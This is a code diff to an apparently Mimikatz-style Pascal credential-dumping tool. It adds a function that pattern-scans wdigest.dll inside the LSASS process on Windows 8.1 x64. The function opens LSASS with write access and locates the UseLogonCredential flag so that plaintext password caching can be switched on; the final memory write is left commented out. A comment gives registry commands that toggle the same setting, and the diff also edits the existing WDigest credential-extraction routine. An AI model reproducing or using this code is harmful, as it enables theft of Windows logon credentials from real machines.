@@ -13,6 +13,8 @@ function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes)
 function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
 
 function wdigest(pid:dword):boolean;
+function wdigest_on(pid:dword):boolean;
+
 function dpapi(pid:dword):boolean;
 
 function lsasecret(server:string;key:string;var output:tbytes):boolean;
@@ -866,12 +868,97 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
        end;//if openprocess...
 end;
 
+
+
+{
+see
+https://gist.github.com/xpn/163360379f3cce2443a7b074f0a173b8
+https://blog.xpnsec.com/exploring-mimikatz-part-1/
+the below requires a reboot...
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
+to query...
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential}
+function wdigest_on(pid:dword):boolean;
+const
+
+  //dd wdigest!g_fParameter_UseLogonCredential in windbg
+  //or
+  //search g_fParameter_UseLogonCredential in IDA
+  //look for cmp     cs:g_fParameter_UseLogonCredential, ebx
+  //which translates to 39 1D F5  14 03 00
+  //F5  14 03 00 is your offset (from current pos) to g_fParameter_UseLogonCredential
+  //or we could maintain a table of offsets per windows versions...
+  PTRN_WIN81_UseLogonCredential:array [0..14] of byte=  ($F7, $46 ,$50 ,$00 ,$08 ,$00 ,$00 ,$0F ,$85 ,$0C ,$52 ,$00 ,$00 ,$39 ,$1D);
+var
+  module:string='wdigest.dll';
+  hprocess:thandle;
+  offset_dword:dword;
+  read:cardinal;
+  offset:nativeint=0;
+  patch_pos:ShortInt=0;
+  pattern:tbytes; //array of byte;
+  bytes:array[0..254] of byte;
+  dw:dword;
+begin
+result:=false;
+  if pid=0 then exit;
+  //
+  if (lowercase(osarch)='amd64') then
+     begin
+     if copy(winver,1,3)='6.3' then
+        if 1=1 then
+        begin
+        setlength(pattern,sizeof(PTRN_WIN81_UseLogonCredential));
+        copymemory(@pattern[0],@PTRN_WIN81_UseLogonCredential[0],sizeof(PTRN_WIN81_UseLogonCredential));
+        patch_pos:=4;
+        end
+        else
+        begin
+        end;
+     end;
+
+  if patch_pos =0 then
+     begin
+     log('no patch mod for this windows version',1);
+     exit;
+     end;
+  log('patch pos:'+inttostr(patch_pos ),0);
+  //
+  if search_module_mem (pid,module,pattern,offset)=false then
+     begin
+     log('search_module_mem NOT OK');
+     exit;
+     end;
+  //
+  if offset<>0 then
+    begin
+    log('found:'+inttohex(offset,sizeof(pointer)),0);
+    //
+    hprocess:=thandle(-1);
+    hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                        false,pid);
+    if hprocess<>thandle(-1) then
+    begin
+    log('openprocess ok',0);
+    if ReadMem  (hprocess,offset+sizeof(PTRN_WIN81_UseLogonCredential),@offset_dword,4) then
+      begin
+      //CopyMemory(@offset_dword,@offset_byte[0],4);
+      log('ReadProcessMemory OK '+inttohex(offset_dword,4));
+      log('g_UseLogonCredential:'+inttohex(offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos,sizeof(pointer)));
+      //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
+      //dw:=1;
+      //WriteProcessMemory (hprocess,pointer(offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_list_dword+patch_pos),@dw,4);
+      result:=true;
+      end; //if readmem
+    closehandle(hprocess);
+    end;
+    end; //if offset<>0 then
+
+end;
+
 //check kuhl_m_sekurlsa_utils.c
 function wdigest(pid:dword):boolean;
 const
-  //dd Lsasrv!LogonSessionList in windbg
-  WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
-  WNBLUE_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
   // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
@@ -948,6 +1035,12 @@ begin
      exit;
      end;
   log('patch pos:'+inttostr(patch_pos ),0);
+  //
+  if search_module_mem (pid,module,pattern,offset)=false then
+     begin
+     log('search_module_mem NOT OK');
+     exit;
+     end;
   //
   hprocess:=thandle(-1);
   hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
